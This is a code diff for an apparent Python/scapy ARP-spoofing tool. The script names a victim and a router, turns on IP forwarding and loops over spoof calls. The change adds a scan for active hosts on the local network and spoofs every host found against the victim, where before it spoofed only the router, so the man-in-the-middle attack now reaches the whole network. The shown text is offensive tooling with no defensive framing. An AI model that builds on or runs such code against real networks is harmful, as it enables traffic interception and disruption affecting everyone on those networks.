@@ -6,6 +6,7 @@ import argparse
 import regex
 from scapy.all import *
 from scapy.layers.l2 import arping
+import LocalNetworkScan as Scan
 
 # General variables
 interface = ""
@@ -18,6 +19,7 @@ verbose = 0
 # Variables for MAC address
 victimMAC = None
 routerMAC = None
+
 
 
 def print_force(string):
@@ -100,8 +102,16 @@ def run():
         grab_MAC_Addresses()
         set_ip_forward(True)
 
+        # Grabs all active hosts
+        activeHosts = Scan.scan_for_active_hosts()
+        print('[!] Grabbing hosts successful, there are {} hosts'.format(len(activeHosts)))
+
         while True:
-            spoof(routerIP, victimIP)
+
+            # Loops round and changes values for all hosts
+            for host in activeHosts:
+                spoof(host, victimIP)
+
             time.sleep(5)
 
     except KeyboardInterrupt:
